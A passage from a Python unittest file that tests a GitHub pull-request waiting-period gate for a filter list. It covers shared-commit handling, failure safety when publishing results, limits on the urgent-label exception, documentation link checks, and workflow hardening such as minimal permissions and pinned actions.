            gate.Gate(api, REPO, CFG).process(N)

    # -- two pull requests, one commit
    def test_shared_head_uses_the_stricter_result(self):
        api = base_scenario()
        run(api, at(minutes=10))
        head = api.pr["head"]["sha"]
        api.siblings = [{"number": 8, "state": "open", "head": {"sha": head}},
                        {"number": 9, "state": "closed", "head": {"sha": head}},
                        {"number": 10, "state": "open", "head": {"sha": "0" * 40}}]
        orig = gate.Gate.evaluate
        asked = []
        def fake(self, number):
            if number == 8:
                asked.append(number)
                return (gate.Result("pending", "Waiting", "other PR is still waiting", head), {}, None, [], {})
            return orig(self, number)
        gate.Gate.evaluate = fake
        try:
            c = run(api, at(minutes=10, hours=80))                  # this PR alone would pass
        finally:
            gate.Gate.evaluate = orig
        self.assertEqual(asked, [8])                                # closed and other-head PRs are not consulted
        self.assertEqual(verdict(c), "pending")
        self.assertIn("Shared commit", c["output"]["title"])
        self.assertIn("#8", c["output"]["summary"])

    # -- publishing safety
    def test_state_write_failure_publishes_no_pass(self):
        api = base_scenario()
        api.fail_post_on = "/comments"
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).process(N)
        self.assertNotIn("success", [c.get("conclusion") for c in api.checks])
        self.assertEqual(api.checks[-1]["conclusion"], "failure")

    def test_check_write_failure_raises(self):
        api = base_scenario()
        api.fail_post_on = "/check-runs"
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).process(N)
        self.assertEqual(api.checks, [])

    def test_label_or_draft_change_during_evaluation_drops_the_result(self):
        for change in ("label", "draft"):
            with self.subTest(change):
                api = base_scenario()
                g = gate.Gate(api, REPO, CFG)
                api.t = at(hours=100)
                result, state, state_id, comments, pr = g.evaluate(N)
                if change == "label":
                    api.pr["labels"] = []
                else:
                    api.pr["draft"] = True
                self.assertIn("changed during evaluation", g.publish(N, result, state, state_id, comments, pr, result))
                self.assertEqual(api.checks, [])

    # -- urgent exception limits
    def test_urgent_only_covers_the_list_file(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified", "patch": RULE_DEL},
                 {"filename": "filters/BareFilter.md", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b\n"})
        api.sync_pr_files()
        api.pr_files = [{"filename": PATH, "status": "modified", "patch": RULE_DEL},
                        {"filename": "filters/BareFilter.md", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b\n"}]
        run(api, at(minutes=1))
        api.label(CFG["urgent_label"], at(minutes=5))
        api.comments.append({"id": 50, "body": "Rule hides the whole page on a test site; removing it now.",
                             "created_at": iso(at(minutes=6)), "user": {"login": OWNER, "type": "User"}})
        self.assertNotEqual(verdict(run(api, at(minutes=7))), "success")

    def test_urgent_void_if_a_commit_arrives_after_the_label(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified", "patch": RULE_DEL}); api.sync_pr_files()
        run(api, at(minutes=1))
        api.label(CFG["urgent_label"], at(minutes=5))
        api.comments.append({"id": 50, "body": "Rule hides the whole page on a test site; removing it now.",
                             "created_at": iso(at(minutes=6)), "user": {"login": OWNER, "type": "User"}})
        self.assertEqual(verdict(run(api, at(minutes=7))), "success")
        api.push({"filename": PATH, "status": "modified", "patch": "@@ -1,2 +1 @@\n-reddit.com##div.other\n"}); api.sync_pr_files()
        api.pr_files = [{"filename": PATH, "status": "modified", "patch": RULE_DEL + "@@ -9 +8,0 @@\n-reddit.com##div.other\n"}]
        c = run(api, at(minutes=8))                                 # a different removal the owner never reviewed
        self.assertNotEqual(verdict(c), "success")
        self.assertIn("pushed after the owner", c["output"]["summary"])


class Docs(unittest.TestCase):
    ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

    def test_relative_links_resolve_to_real_files(self):
        files = ["filters/CONTRIBUTING.md", "filters/AGENTS.md", ".github/barefilter-gate/README.md",
                 ".github/PULL_REQUEST_TEMPLATE/barefilter.md", ".github/ISSUE_TEMPLATE/barefilter-report.md"]
        checked = 0
        for rel in files:
            path = os.path.join(self.ROOT, rel)
            for target in re.findall(r"\]\(([^)\s]+)\)", open(path).read()):
                if re.match(r"^(https?:|mailto:|#)", target):
                    continue
                resolved = os.path.normpath(os.path.join(os.path.dirname(path), target.split("#")[0]))
                self.assertTrue(resolved.startswith(self.ROOT + os.sep), "%s: %s leaves the repository" % (rel, target))
                self.assertTrue(os.path.exists(resolved), "%s: %s does not exist" % (rel, target))
                checked += 1
        self.assertGreater(checked, 5)


class Workflow(unittest.TestCase):
    """The workflow file must keep the security properties the README promises."""

    @classmethod
    def setUpClass(cls):
        here = os.path.dirname(os.path.abspath(__file__))
        cls.text = open(os.path.join(here, "..", "workflows", "barefilter-waiting-period.yml")).read()
        cls.code = "\n".join(l for l in cls.text.splitlines() if not l.strip().startswith("#"))

    def test_uses_pull_request_target_not_pull_request(self):
        self.assertIn("pull_request_target:", self.code)
        self.assertNotRegex(self.code, r"(?m)^\s+pull_request:")

    def test_never_checks_out_pull_request_code(self):
        self.assertNotIn("github.event.pull_request.head", self.code)
        self.assertNotRegex(self.code, r"(?m)^\s+ref:")
        self.assertIn("persist-credentials: false", self.code)

    def test_no_untrusted_expressions_in_shell(self):
        run_block = self.code.split("run:", 1)[1]
        self.assertNotIn("${{", run_block)
        for expr in re.findall(r"\$\{\{\s*([^}]*)\}\}", self.code):
            self.assertIn(expr.strip().split()[0], ("secrets.GITHUB_TOKEN", "github.event.pull_request.number"), expr)

    def test_minimal_permissions(self):
        self.assertIn("permissions: {}", self.code)
        self.assertNotIn("write-all", self.code)
        self.assertNotIn("contents: write", self.code)
        self.assertEqual(sorted(re.findall(r"(\w[\w-]*): write", self.code)), ["checks", "pull-requests"])

    def test_actions_pinned_to_full_commit(self):
        for ref in re.findall(r"uses:\s*\S+@(\S+)", self.code):
            self.assertRegex(ref, r"^[0-9a-f]{40}$")

    def test_concurrency_is_per_pull_request_and_never_cancels_running_work(self):
        self.assertRegex(self.code, r"group: barefilter-waiting-period-\$\{\{ github\.event\.pull_request\.number")
        self.assertNotIn("cancel-in-progress: true", self.code)

    def test_no_other_secrets(self):
        self.assertEqual(re.findall(r"secrets\.(\w+)", self.code), ["GITHUB_TOKEN"])


if __name__ == "__main__":
    unittest.main()
